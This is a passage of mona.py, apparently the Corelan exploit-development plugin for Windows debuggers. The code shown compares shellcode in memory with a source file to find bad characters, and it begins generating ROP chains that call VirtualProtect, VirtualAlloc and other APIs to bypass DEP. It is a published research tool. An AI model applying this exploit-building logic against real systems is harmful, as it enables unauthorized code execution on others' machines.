						err("Could not process %s bytes line ('%s') as %s formatted! Quitting." %
							(self.name, line, self.format))
					else:
						verbose("Line ('%s'), bytes ('%s'), extracted ('%s'), len: %d" %
							(line, extract, bytes_line, len(bytes_line)))
						self.bytes.extend(bytes_line)
				else:
					if callback_called:
						verbose("Callback failure: transformed string ('%s') did not catched on returned match" % (line))
					else:
						verbose("Parsing line ('%s') failed with format '%s'." % (line, self.format))

			return len(self.bytes) > 0

		@staticmethod
		def get_available_formats():
			avail_formats = ['raw']
			avail_formats.extend(list(BytesParser.formats_rex.keys()))
			for k, v in BytesParser.formats_aliases.items():
				avail_formats.extend(v)
			return avail_formats

		@staticmethod
		def get_available_format():
			formats = ', '.join(["'" + x + "'" for x in BytesParser.get_available_formats()])
			return formats

		@staticmethod
		def is_valid_format(format):
			return format in BytesParser.get_available_formats()

		def get_bytes(self):
			return self.bytes

		formats_callbacks = {
			'dword': unpack_dword
		}


	########## END Class : BytesParser
	dbg.log("[+] Reading file %s..." % filename)
	srcdata_normal = b""
	srcdata_unicode = b""
	tagresults = []
	criteria = {}
	criteria["accesslevel"] = "*"

	try:
		srcfile = open(filename, "rb")
		srcdata_normal = srcfile.read()
		srcfile.close()

		# Convert to "unicode" style bytes: 41 42 43 -> 41 00 42 00 43 00
		srcdata_unicode = b"".join(
			struct.pack("B", _ord(eachByte)) + b"\x00"
			for eachByte in srcdata_normal
		)

		dbg.log("    Read %d bytes from file" % len(srcdata_normal))
	except Exception as e:
		dbgp("Error reading file %s: %s" % (filename, str(e)), errormode=False)
		dbg.log("Error while reading file %s" % filename, highlight=1)
		return


	# loop normal and unicode
	comparetable = dbg.createTable('mona Memory comparison results', ['Address', 'Status', 'BadChars', 'Type', 'Location'])
	modes = ["normal", "unicode"]
	if not findunicode:
		modes.remove("unicode")
	objlogfile = MnLog("compare.txt")
	logfile = objlogfile.reset(skipModuleTable=True)
	for mode in modes:
		if mode == "normal":
			srcdata = srcdata_normal
		if mode == "unicode":
			srcdata = srcdata_unicode

		# check if user supplied input is valid input
		if format and not BytesParser.is_valid_format(format):
			err("Format that was specified is not recognized.")
			err("Valid formats: %s" % BytesParser.get_available_format())

		# parse input file
		b = BytesParser(srcdata, filename, format)
		if not b.parsed:
			return False
		else:
			srcdata = b.get_bytes()

		# convert bytes array (from BytesParser) to string array
		# mona expects input as string array
		bytetostr = []
		for eachByte in srcdata:
			bytetostr.append(chr(_ord(eachByte)))
		srcdata = bytetostr

		maxcnt = len(srcdata)
		if maxcnt < 8:
			dbg.log("Error - file does not contain enough bytes (min 8 bytes needed)", highlight=1)
			return
		locations = []
		if startpos == 0:
			dbg.log("[+] Locating all copies in memory (%s)" % mode)
			btcnt = 0
			cnt = 0
			linecount = 0
			hexstr = ""
			hexbytes = ""
			for eachByte in srcdata:
				if cnt < 8:
					hexbytes += eachByte
					if len((hex(_ord(srcdata[cnt]))).replace('0x', '')) == 1:
						hexchar = hex(_ord(srcdata[cnt])).replace('0x', '\\x0')
					else:
						hexchar = hex(_ord(srcdata[cnt])).replace('0x', '\\x')
					hexstr += hexchar
				cnt += 1
			dbg.log("    - searching for " + hexstr)
			global silent
			silent = True
			results = findPattern({}, criteria, hexstr, "bin", 0, TOP_USERLAND, False)

			for _type in results:
				for ptr in results[_type]:
					ptrinfo = MnPointer(ptr).memLocation()
					if not skipmodules or (skipmodules and (ptrinfo in ["Heap", "Stack", "??"])):
						locations.append(ptr)
			if len(locations) == 0:
				dbg.log("      Oops, no copies found")
		else:
			startpos_fixed = startpos
			locations.append(startpos_fixed)
		if len(locations) > 0:
			dbg.log("    - Comparing %d location(s)" % (len(locations)))
			dbg.log("Comparing bytes from file with memory :")
			for location in locations:
				memcompare(location, srcdata, comparetable, mode, smart=(mode == 'normal'))
		silent = False
	return


def memoized(func):
	''' A function decorator to make a function cache it's return values.
	If a function returns a generator, it's transformed into a list and
	cached that way. '''
	cache = {}
	def wrapper(*args):
		if args in cache:
			return cache[args]
		import time; start = time.time()
		val = func(*args)
		if isinstance(val, types.GeneratorType):
			val = list(val)
		cache[args] = val
		return val
	wrapper.__doc__ = func.__doc__
	wrapper.func_name = '%s_memoized' % func.__name__
	return wrapper

class MemoryComparator(object):
	''' Solve the memory comparison problem with a special dynamic programming
	algorithm similar to that for the LCS problem '''

	dbgp(get_current_function_name())

	Chunk = namedtuple('Chunk', 'unmodified i j dx dy xchunk ychunk')

	move_to_gradient = {
		0: (0, 0),
		1: (0, 1),
		2: (1, 1),
		3: (2, 1),
	}

	def __init__(self, x, y):
		self.x, self.y = x, y

	@memoized
	def get_last_unmodified_chunk(self):
		''' Returns the index of the last chunk of size > 1 that is unmodified '''
		try:
			return max(i for i, c in enumerate(self.get_chunks()) if c.unmodified and c.dx > 1)
		except:
			# no match
			return -1

	@memoized
	def get_grid(self):
		''' Builds a 2-d suffix grid for our DP algorithm. '''
		x = self.x
		y = self.y[:len(x) * 2]
		width, height = len(x), len(y)
		values = [[0] * (width + 1) for j in range(height + 1)]
		moves = [[0] * (width + 1) for j in range(height + 1)]
		equal = [[x[i] == y[j] for i in range(width)] for j in range(height)]
		equal.append([False] * width)

		for j, i in itertools.product(rrange(height + 1), rrange(width + 1)):
			value = values[j][i]
			if i >= 1 and j >= 1:
				if equal[j - 1][i - 1]:
					values[j - 1][i - 1] = value + 1
					moves[j - 1][i - 1] = 2
				elif value > values[j][i - 1]:
					values[j - 1][i - 1] = value
					moves[j - 1][i - 1] = 2
			if i >= 1 and not equal[j][i - 1] and value - 2 > values[j][i - 1]:
				values[j][i - 1] = value - 2
				moves[j][i - 1] = 1
			if i >= 1 and j >= 2 and not equal[j - 2][i - 1] and value - 1 > values[j - 2][i - 1]:
				values[j - 2][i - 1] = value - 1
				moves[j - 2][i - 1] = 3
		return (values, moves)

	@memoized
	def get_blocks(self):
		'''
		Compares two binary strings under the assumption that y is the result of
		applying the following transformations onto x:

		 * change single bytes in x (likely)
		 * expand single bytes in x to two bytes (less likely)
		 * drop single bytes in x (even less likely)

		Returns a list of elements of the form (unmodified, xdiff, ydiff),
		where each item represents a binary chunk with "unmodified" denoting whether the
		chunk is the same in both strings, "xdiff" denoting the size of the chunk in x
		and "ydiff" denoting the size of the chunk in y.

		Example:
		>>> x = "abcdefghijklm"
		>>> y = "mmmcdefgHIJZklm"
		>>> list(MemoryComparator(x, y).get_blocks())
		[(False, 2, 3), (True, 5, 5),
		 (False, 3, 4), (True, 3, 3)]
		'''
		x, y = self.x, self.y
		_, moves = self.get_grid()

		# walk the grid
		path = []
		i, j = 0, 0
		while True:
			dy, dx = self.move_to_gradient[moves[j][i]]
			if dy == dx == 0:
				break
			path.append((dy == 1 and x[i] == y[j], dy, dx))
			j, i = j + dy, i + dx

		for i2, j2 in zip(range(i, len(x)), itertools.count(j)):
			if j2 < len(y):
				path.append((x[i2] == y[j2], 1, 1))
			else:
				path.append((False, 0, 1))

		out = []
		for unmodified, subpath in itertools.groupby(path, itemgetter(0)):
			ydiffs = [entry[1] for entry in subpath]
			dx, dy = len(ydiffs), sum(ydiffs)
			out.append((unmodified, dx, dy))
		return out

	@memoized
	def get_chunks(self):
		out = []
		i = j = 0
		for unmodified, dx, dy in self.get_blocks():
			out.append(self.Chunk(unmodified, i, j, dx, dy, self.x[i:i + dx], self.y[j:j + dy]))
			i += dx
			j += dy
		return out

	@memoized
	def guess_mapping(self):
		''' Tries to guess how the bytes in x have been mapped to substrings in y by
		applying nasty heuristics.

		Examples:
		>>> list(MemoryComparator("abcdefghijklm", "mmmcdefgHIJZklm").guess_mapping())
		[('m', 'm'), ('m',), ('c',), ('d',), ('e',), ('f',), ('g',), ('H', 'I'), ('J',),
		 ('Z',), ('k',), ('l',), ('m',)]
		>>> list(MemoryComparator("abcdefgcbadefg", "ABBCdefgCBBAdefg").guess_mapping())
		[('A',), ('B', 'B'), ('C',), ('d',), ('e',), ('f',), ('g',), ('C',), ('B', 'B'),
		 ('A',), ('d',), ('e',), ('f',), ('g',)]
		'''
		x, y = self.x, self.y

		mappings_by_byte = defaultdict(lambda: defaultdict(int))
		for c in self.get_chunks():
			dx, dy = c.dx, c.dy
			# heuristics to detect expansions
			if dx < dy and dy - dx <= 3 and dy <= 5:
				for i, b in enumerate(c.xchunk):
					slices = set()
					for start in range(i, min(2 * i + 1, dy)):
						for size in range(1, min(dy - start + 1, 3)):
							slc = tuple(c.ychunk[start:start + size])
							if slc in slices:
								continue
							mappings_by_byte[b][slc] += 1
							slices.add(slc)

		for b, values in mappings_by_byte.items():
			mappings_by_byte[b] = sorted(values.items(), key=lambda vc: (-vc[1], -len(vc[0])))

		out = []
		for c in self.get_chunks():
			dx, dy, xchunk, ychunk = c.dx, c.dy, c.xchunk, c.ychunk
			if dx < dy:  # expansion
				# try to apply heuristics for small chunks
				if dx <= 10:
					res = []
					for b in xchunk:
						if dx == dy or dy >= 2 * dx:
							break
						for value, count in mappings_by_byte[b]:
							if tuple(ychunk[:len(value)]) != value:
								continue
							res.append(value)
							ychunk = ychunk[len(value):]
							dy -= len(value)
							break
						else:
							if len(ychunk) > 0:
								res.append((ychunk[0],))
								ychunk = ychunk[1:]
								dy -= 1
						dx -= 1
					for c2 in res:
						out.append(c2)

				# ... or do it the stupid way. If n bytes were changed to m, simply do
				# as much drops/expansions as necessary at the beginning and than
				# yield the rest of the y chunk as single-byte modifications
				for k in range(dy - dx):
					out.append(tuple(ychunk[2 * k:2 * k + 2]))
				ychunk = ychunk[2 * (dy - dx):]
			elif dx > dy:
				for _ in range(dx - dy):
					out.append(())

			for b in ychunk:
				out.append((b,))
		return out


def read_memory(dbg, location, max_size):
	''' read the maximum amount of memory from the given address '''
	for i in rrange(max_size + 1, 0):
		mem = dbg.readMemory(location, i)
		if len(mem) == i:
			return mem
	# we should never get here, i == 0 should always fulfill the above condition
	assert False


def shorten_bytes(bytestr, size=8):
	if len(bytestr) <= size:
		return bin2hex(bytestr)
	return '%02x ... %02x' % (_ord(bytestr[0]), _ord(bytestr[-1]))


def draw_byte_table(mapping, log, columns=16):
	hrspace = 3 * columns - 1
	hr = '-' * hrspace
	log('    ,' + hr + '.')
	log('    |' + ' Comparison results:'.ljust(hrspace) + '|')
	log('    |' + hr + '|')
	for i, chunk in enumerate(extract_chunks(mapping, columns)):
		chunk = list(chunk)  # save generator result in a list
		if len(chunk) == 0:
			continue
		src, mapped = zip(*chunk)
		values = []
		for left, right in zip(src, mapped):
			if left == right:
				values.append('')             # byte matches original
			elif len(right) == 0:
				values.append('-1')           # byte dropped
			elif len(right) == 2:
				values.append('+1')           # byte expanded
			else:
				values.append(bin2hex(right)) # byte modified
		line1 = '%3x' % (i * columns) + ' |' + bin2hex(src)
		line2 = '    |' + ' '.join(sym.ljust(2) for sym in values)

		# highlight lines if a modification was detected - removed, looks bad in WinDBG
		#highlight = any(x != y for x, y in chunk)
		#for l in (line1, line2):
		log(line1.ljust(5 + hrspace) + '| File')
		log(line2.ljust(5 + hrspace) + '| Memory')
	log('    `' + hr + "'")


def draw_chunk_table(cmp, log):
	''' Outputs a table that compares the found memory chunks side-by-side
	in input file vs. memory '''
	table = [('', '', '', '', 'File', 'Memory', 'Note')]
	delims = (' ', ' ', ' ', ' | ', ' | ', ' | ', '')
	last_unmodified = cmp.get_last_unmodified_chunk()
	for c in cmp.get_chunks():
		if c.dy == 0:
			note = 'missing'
		elif c.dx > c.dy:
			note = 'compacted'
		elif c.dx < c.dy:
			note = 'expanded'
		elif c.unmodified:
			note = 'unmodified!'
		else:
			note = 'corrupted'
		table.append((c.i, c.j, c.dx, c.dy, shorten_bytes(c.xchunk), shorten_bytes(c.ychunk), note))

	# draw the table
	sizes = tuple(max(len(str(c)) for c in col) for col in zip(*table))
	for i, row in enumerate(table):
		log(''.join(str(x).ljust(size) + delim for x, size, delim in zip(row, sizes, delims)))
		if i == 0 or (i == last_unmodified + 1 and i < len(table)):
			log('-' * (sum(sizes) + sum(len(d) for d in delims)))

def guess_bad_chars(cmp, log, logsilent, mapping=None):
	''' Tries to guess bad characters and outputs them '''
	guessed_badchars = []
	bytes_in_changed_blocks = defaultdict(int)
	chunks = cmp.get_chunks()
	last_unmodified = cmp.get_last_unmodified_chunk()

	# Strongest signal: first actual mismatching source byte from the byte mapping
	first_broken_src = None
	if mapping:
		for x, y in mapping:
			if x != y:
				first_broken_src = x
				break

	for i, c in enumerate(chunks):
		if c.unmodified:
			continue

		if i == last_unmodified + 1:
			# Prefer the first actual mismatching byte if we know it
			if first_broken_src is not None:
				bytes_in_changed_blocks[first_broken_src] += 1
			elif len(c.xchunk) > 0:
				bytes_in_changed_blocks[c.xchunk[0]] += 1
			break

		for b in set(c.xchunk):
			bytes_in_changed_blocks[b] += 1

	# Guess bad chars
	likely_bc = [char for char, count in bytes_in_changed_blocks.items() if count > 2]

	if first_broken_src is not None:
		if not logsilent:
			log("First mismatching byte: %s" % bin2hex(first_broken_src))
		if first_broken_src not in guessed_badchars:
			guessed_badchars.append(first_broken_src)

	if likely_bc:
		if not logsilent:
			log("Very likely bad chars: %s" % bin2hex(sorted(set(likely_bc))))
		for b in likely_bc:
			if b not in guessed_badchars:
				guessed_badchars.append(b)

	if not logsilent and len(bytes_in_changed_blocks) > 0:
		log("Possibly bad chars: %s" % bin2hex(sorted(bytes_in_changed_blocks)))

	for b in sorted(bytes_in_changed_blocks):
		if b not in guessed_badchars:
			guessed_badchars.append(b)

	# List bytes already omitted from the input
	bytes_omitted_from_input = set(chr(i) for i in range(0, 256)) - set(cmp.x)
	if bytes_omitted_from_input:
		if not logsilent:
			log("Bytes omitted from input: %s" % bin2hex(sorted(bytes_omitted_from_input)))
		for b in sorted(bytes_omitted_from_input):
			if b not in guessed_badchars:
				guessed_badchars.append(b)

	return guessed_badchars


def memcompare(location, src, comparetable, sctype, smart=True, tablecols=16):
	''' Thoroughly compares an input binary string with a location in memory
	and outputs the results. '''

	# set up logging
	objlogfile = MnLog("compare.txt")
	logfile = objlogfile.reset(False)

	# helpers
	def log(msg='', **kw):
		msg = str(msg)
		dbg.log(msg, address=location, **kw)
		objlogfile.write(msg, logfile)

	def add_to_table(msg, badbytes=[]):
		locinfo = MnPointer(location).memLocation()
		badbstr = " "
		if len(badbytes) > 0:
			badbstr = "%s " % bin2hex(sorted(badbytes))
		comparetable.add(0, ['0x%08x' % location, msg, badbstr, sctype, locinfo])

	objlogfile.write("-" * 100, logfile)
	log('[+] Comparing with memory at location : %s (%s)' % (PTR_PRINT % location, MnPointer(location).memLocation()), highlight=1)
	dbg.updateLog()

	mem = read_memory(dbg, location, 2 * len(src))
	if smart:
		cmp = MemoryComparator(src, mem)
		mapped_chunks = [''.join(chr(_ord(b)) for b in chunk) for chunk in cmp.guess_mapping()]
	else:
		mapped_chunks = [chr(_ord(b)) for b in mem[:len(src)]] + [()] * (len(src) - len(mem))

	mapping = list(zip(src, mapped_chunks))

	broken = [(i, x, y) for i, (x, y) in enumerate(mapping) if x != y]
	if not broken:
		log('!!! Hooray, %s shellcode unmodified !!!' % sctype, focus=1, highlight=1)
		add_to_table('Unmodified')
		if smart:
			guessed_bc = guess_bad_chars(cmp, log, True, mapping)
	else:
		log("Only %d original bytes of '%s' code found." % (len(src) - len(broken), sctype))
		draw_byte_table(mapping, log, columns=tablecols)
		log()
		guessed_bc = []
		if smart:
			# print additional analysis
			draw_chunk_table(cmp, log)
			log()
			# False = show the guessed bad chars
			guessed_bc = guess_bad_chars(cmp, log, False, mapping)
			log()
		add_to_table('Corruption after %d bytes' % broken[0][0], guessed_bc)



#-----------------------------------------------------------------------#
# ROP related functions
#-----------------------------------------------------------------------#

def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,criteria,objprogressfile,progressfile,technique):
	"""
	Will attempt to produce ROP chains
	"""

	dbgp(get_current_function_name())
	
	global ptr_to_get
	global ptr_counter
	global silent
	global noheader
	

	#vars
	vplogtxt = ""
	
	# RVA ?
	showrva = False
	if "rva" in criteria:
		showrva = True

	#define rop routines
	routinedefs = {}
	routinesetup = {}
	
	virtualprotect 				= [["esi","api"],["ebp","jmp esp"],["ebx",0x201],["edx",0x40],["ecx","&?W"],["edi","ropnop"],["eax","nop"]]
	virtualalloc				= [["esi","api"],["ebp","jmp esp"],["ebx",0x01],["edx",0x1000],["ecx",0x40],["edi","ropnop"],["eax","nop"]]
	setinformationprocess		= [["ebp","api"],["edx",0x22],["ecx","&","0x00000002"],["ebx",0xffffffff],["eax",0x4],["edi","pop"]] 
	setprocessdeppolicy			= [["ebp","api"],["ebx","&","0x00000000"],["edi","pop"]]
	
	routinedefs["VirtualProtect"] 			= virtualprotect
	routinedefs["VirtualAlloc"] 			= virtualalloc
	# only run these on older systems
	osver=dbg.getOsVersion()
	if not (osver == "6" or osver == "7" or osver == "8" or osver == "10" or osver == "11" or osver == "vista" or osver == "win7" or osver == "2008server" or osver == "win8" or osver == "win8.1" or osver == "win10"):
		routinedefs["SetInformationProcess"]	= setinformationprocess
		routinedefs["SetProcessDEPPolicy"]		= setprocessdeppolicy	
	
	modulestosearch = getModulesToQuery(modulecriteria)
	
	routinesetup["VirtualProtect"] = """--------------------------------------------
 eax = NOP (0x90909090)
 ecx = lpOldProtect (ptr to W address)
 edx = NewProtect (0x40)
 ebx = dwSize
 esp = lPAddress (automatic)
 ebp = ReturnTo (ptr to jmp esp)
 esi = ptr to VirtualProtect()
 edi = ROP NOP (RETN)
 --- alternative chain ---
 eax = ptr to &VirtualProtect()
 ecx = lpOldProtect (ptr to W address)
 edx = NewProtect (0x40)
 ebx = dwSize
 esp = lPAddress (automatic)
 ebp = POP (skip 4 bytes)
 esi = ptr to JMP [EAX]
 edi = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below pushad
--------------------------------------------"""


	routinesetup["VirtualAlloc"] = """--------------------------------------------
 eax = NOP (0x90909090)
 ecx = flProtect (0x40)
 edx = flAllocationType (0x1000)
 ebx = dwSize
 esp = lpAddress (automatic)
 ebp = ReturnTo (ptr to jmp esp)
 esi = ptr to VirtualAlloc()
 edi = ROP NOP (RETN)
 --- alternative chain ---
 eax = ptr to &VirtualAlloc()
 ecx = flProtect (0x40)
 edx = flAllocationType (0x1000)
 ebx = dwSize
 esp = lpAddress (automatic)
 ebp = POP (skip 4 bytes)
 esi = ptr to JMP [EAX]
 edi = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------"""

	routinesetup["SetInformationProcess"] = """--------------------------------------------
 eax = SizeOf(ExecuteFlags) (0x4)
 ecx = &ExecuteFlags (ptr to 0x00000002)
 edx = ProcessExecuteFlags (0x22)
 ebx = NtCurrentProcess (0xffffffff)
 esp = ReturnTo (automatic)
 ebp = ptr to NtSetInformationProcess()
 esi = <not used>
 edi = ROP NOP (4 byte stackpivot)
--------------------------------------------"""

	routinesetup["SetProcessDEPPolicy"] = """--------------------------------------------
 eax = <not used>
 ecx = <not used>
 edx = <not used>
 ebx = dwFlags (ptr to 0x00000000)
 esp = ReturnTo (automatic)
 ebp = ptr to SetProcessDEPPolicy()
 esi = <not used>
 edi = ROP NOP (4 byte stackpivot)
--------------------------------------------"""

	updatetxt = ""
    
	# restrict techniques if needed
	validatedroutinedefs = {}
	if technique != "":
		for routine in routinedefs:
			if technique.lower() == routine.lower():
				validatedroutinedefs[routine] = routinedefs[routine]            
		routinedefs = validatedroutinedefs

	for routine in routinedefs:
	
		thischain = {}
		updatetxt = "Attempting to produce rop chain for %s" % routine 
		dbg.log("")
		dbg.log("-" * 80)
		dbg.log("")
		dbg.log("[+] %s" % updatetxt)
		objprogressfile.write("- " + updatetxt,progressfile)
		vplogtxt += "\n"
		vplogtxt += "#" * 80
		vplogtxt += "\n\nRegister setup for " + routine + "() :\n" + routinesetup[routine] + "\n\n"
		targetOS = "(XP/2003 Server and up)"
		if routine == "SetInformationProcess":
			targetOS = "(XP/2003 Server only)"
		if routine == "SetProcessDEPPolicy":
			targetOS = "(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)"
		title = "ROP Chain for %s() [%s] :" % (routine,targetOS)
		vplogtxt += "\n%s\n" % title
		vplogtxt += ("-" * len(title)) + "\n\n"
		vplogtxt += "*** [ Ruby ] ***\n\n"
		vplogtxt += "  def create_rop_chain()\n"
		vplogtxt += '\n    # rop chain generated with mona.py - www.corelan.be'
		vplogtxt += "\n    rop_gadgets = \n"
		vplogtxt += "    [\n"
		
		thischaintxt = ""
		
		dbg.updateLog()
		modused = {}
		
		skiplist = []
		replacelist = {}
		toadd = {}
		
		movetolast = []
		regsequences = []
		stepcnt = 1
		for step in routinedefs[routine]:
			thisreg = step[0]
			thistarget = step[1]
			
			if thisreg in replacelist:
				thistarget = replacelist[thisreg]
			
			thistimestamp=get_current_datetime()
			dbg.log("    %s: Step %d/%d: %s" % (thistimestamp,stepcnt,len(routinedefs[routine]),thisreg))
			stepcnt += 1

			if not thisreg in skiplist:
			
				regsequences.append(thisreg)
				
				# this must be done first, so we can determine deviations to the chain using
				# replacelist and skiplist arrays
				if str(thistarget) == "api":
					objprogressfile.write("  * Enumerating ROPFunc info (IAT Query)",progressfile)
					#dbg.log("    Enumerating ROPFunc info")
					# routine to put api pointer in thisreg
					funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"iat", objprogressfile, progressfile)
					if routine == "SetProcessDEPPolicy" and funcptr == 0:
						# read EAT
						funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"eat", objprogressfile, progressfile)
						extra = ""
						if funcptr == 0:
							extra = "[-] Unable to find ptr to "
							thischain[thisreg] = [[0,extra + routine + "() (-> to be put in " + thisreg + ")",0]]
						else:
							thischain[thisreg] = putValueInReg(thisreg,funcptr,routine + "() [" + MnPointer(funcptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						objprogressfile.write("    Function pointer : 0x%0x" % funcptr, progressfile)
						objprogressfile.write("  * Getting pickup gadget",progressfile)
						thischain[thisreg],skiplist = getPickupGadget(thisreg,funcptr,functext,suggestions,interestinggadgets,criteria,modulecriteria,routine)
						# if skiplist is not empty, then we are using the alternative pickup (via jmp [eax])
						# this means we have to make some changes to the routine
						# and place this pickup at the end
						
						if len(skiplist) > 0:
							if routine.lower() == "virtualprotect" or routine.lower() == "virtualalloc":
								replacelist["ebp"] = "pop"

								#set up call to finding jmp esp
								oldsilent = silent
								silent=True
								ptr_counter = 0
								ptr_to_get = 3
								jmpreg = findJMP(modulecriteria,criteria,"esp")
								ptr_counter = 0
								ptr_to_get = -1
								jmpptr = 0
								jmptype = ""
								silent=oldsilent
								total = getNrOfDictElements(jmpreg)
								if total > 0:
									ptrindex = random.randint(1,total)
									indexcnt= 1
									for regtype in jmpreg:
										for ptr in jmpreg[regtype]:
											if indexcnt == ptrindex:
												jmpptr = ptr
												jmptype = regtype
												break
											indexcnt += 1
								if jmpptr > 0:
									toadd[thistarget] = [jmpptr,"ptr to '" + jmptype + "'"]
								else:
									toadd[thistarget] = [jmpptr,"ptr to 'jmp esp'"]
								# make sure the pickup is placed last
								movetolast.append(thisreg)
								
					
				if str(thistarget).startswith("jmp"):
					targetreg = str(thistarget).split(" ")[1]
					#set up call to finding jmp esp
					oldsilent = silent
					silent=True
					ptr_counter = 0
					ptr_to_get = 3
					jmpreg = findJMP(modulecriteria,criteria,targetreg)
					ptr_counter = 0
					ptr_to_get = -1
					jmpptr = 0
					jmptype = ""
					silent=oldsilent
					total = getNrOfDictElements(jmpreg)
					if total > 0:
						ptrindex = random.randint(1,total)
						indexcnt= 1					
						for regtype in jmpreg:
							for ptr in jmpreg[regtype]:
								if indexcnt == ptrindex:
									jmpptr = ptr
									jmptype = regtype
									break
								indexcnt += 1
					jmpinfo = ""
					jmpmodinfo = ""
					if jmpptr == 0:
						jmptype = ""
						jmpinfo = "Unable to find ptr to 'jmp esp'"
					else:
						jmpinfo = MnPointer(jmpptr).belongsTo() 
						tmod = MnModule(jmpinfo)
						jmpmodinfo = getGadgetAddressInfo(jmpptr)
					thischain[thisreg] = putValueInReg(thisreg,jmpptr,"& " + jmptype + " [" + jmpinfo + "]" + jmpmodinfo,suggestions,interestinggadgets,criteria)
				
				if str(thistarget) == "ropnop":
					ropptr = 0
					for poptype in suggestions:
						if poptype.startswith("pop "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
									ropptr = retptr+1
									break
						if poptype.startswith("inc "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
									ropptr = retptr+1
									break
						if poptype.startswith("dec "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
									ropptr = retptr+1
									break
						if poptype.startswith("neg "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
									ropptr = retptr+2
									break
								
					if ropptr == 0:
						for emptytype in suggestions:
							if emptytype.startswith("empty "):
								for retptr in suggestions[emptytype]:
									if interestinggadgets[retptr].startswith("# xor"):
										if getOffset(interestinggadgets[retptr]) == 0:
											ropptr = retptr+2
										break
					if ropptr > 0:
						thismodname = MnPointer(ropptr).belongsTo()
						tmod = MnModule(thismodname)
						ropnopinfo = getGadgetAddressInfo(ropptr)

						thischain[thisreg] = putValueInReg(thisreg,ropptr,"retn (rop nop) [" + thismodname + "]" + ropnopinfo,suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,ropptr,"[-] Unable to find ptr to retn (rop nop)",suggestions,interestinggadgets,criteria)					
				
				
				if thistarget.__class__.__name__ == "int" or thistarget.__class__.__name__ == "long":
					thischain[thisreg] = putValueInReg(thisreg,thistarget,"0x" + toHex(thistarget) + "-> " + thisreg,suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget) == "nop":
					thischain[thisreg] = putValueInReg(thisreg,0x90909090,"nop",suggestions,interestinggadgets,criteria)

					
				if str(thistarget).startswith("&?"):
					#pointer to
					rwptr = getAPointer(modulestosearch,criteria,"RW")
					if rwptr == 0:
						rwptr = getAPointer(modulestosearch,criteria,"W")
					if rwptr != 0:

						rwmodname = MnPointer(rwptr).belongsTo()
						
						rwmodinfo = getGadgetAddressInfo(rwptr)
						thischain[thisreg] = putValueInReg(thisreg,rwptr,"&Writable location [" + rwmodname+"]" + rwmodinfo,suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,rwptr,"[-] Unable to find writable location",suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget).startswith("pop"):
					#get distance
					if "pop " + thisreg in suggestions:
						popptr = getShortestGadget(suggestions["pop "+thisreg])
						junksize = getJunk(interestinggadgets[popptr])-4
						thismodname = MnPointer(popptr).belongsTo()
						tmodinfo = getGadgetAddressInfo(popptr)
						thischain[thisreg] = [[popptr,"",junksize],[popptr,"skip 4 bytes [" + thismodname + "]" + tmodinfo]]
					else:
						thischain[thisreg] = [[0,"[-] Couldn't find a gadget to put a pointer to a stackpivot (4 bytes) into "+ thisreg,0]]
	
				
				if str(thistarget)==("&"):
					pattern = step[2]
					base = 0
					top = TOP_USERLAND
					type = "ptr"
					al = criteria["accesslevel"]
					criteria["accesslevel"] = "R"
					ptr_counter = 0				
					ptr_to_get = 2
					oldsilent = silent
					silent=True				
					allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
					silent = oldsilent
					criteria["accesslevel"] = al
					if len(allpointers) > 0:
						theptr = 0
						for ptrtype in allpointers:
							for ptrs in allpointers[ptrtype]:
								theptr = ptrs
								break
						thischain[thisreg] = putValueInReg(thisreg,theptr,"&" + str(pattern) + " [" + MnPointer(theptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,0,"[-] Unable to find ptr to " + str(pattern),suggestions,interestinggadgets,criteria)
						
		returnoffset = 0
		delayedfill = 0
		junksize = 0
		# get longest modulename
		longestmod = 0
		fillersize = 0
		for step in routinedefs[routine]:
			thisreg = step[0]
			if thisreg in thischain:
				for gadget in thischain[thisreg]:
					thismodname = sanitize_module_name(MnPointer(gadget[0]).belongsTo())
					if len(thismodname) > longestmod:
						longestmod = len(thismodname)
		if showrva:
			fillersize = longestmod + 8
		else:
			fillersize = 0
		
		# modify the chain order (regsequences array)
		for reg in movetolast:
			if reg in regsequences:
				regsequences.remove(reg)
				regsequences.append(reg)
		

		regimpact = {}
		# create the current chain
		ropdbchain = ""
		tohex_array = []
		for step in regsequences:
			thisreg = step
			vplogtxt += 	"      #[---INFO:gadgets_to_set_%s:---]\n" % (thisreg) 
			thischaintxt += "      #[---INFO:gadgets_to_set_%s:---]\n" % (thisreg)
			if thisreg in thischain:
				for gadget in thischain[thisreg]:
					gadgetstep = gadget[0]
					steptxt = gadget[1]
					junksize = 0
					showfills = False
					if len(gadget) > 2:
						junksize = gadget[2]
					if gadgetstep in interestinggadgets and steptxt == "":
						thisinstr = interestinggadgets[gadgetstep].lstrip()
						if thisinstr.startswith("#"):
							thisinstr = thisinstr[2:len(thisinstr)]
							showfills = True
						thismodname = MnPointer(gadgetstep).belongsTo()
						thisinstr += " [" + thismodname + "]"
						tmod = MnModule(thismodname)
						thisinstr += getGadgetAddressInfo(gadgetstep)
						if not thismodname in modused:
							modused[thismodname] = [tmod.moduleBase,tmod.__str__()]	
						modprefix = "base_" + sanitize_module_name(thismodname)
						if showrva:
							alignsize = longestmod - len(sanitize_module_name(thismodname))
							vplogtxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
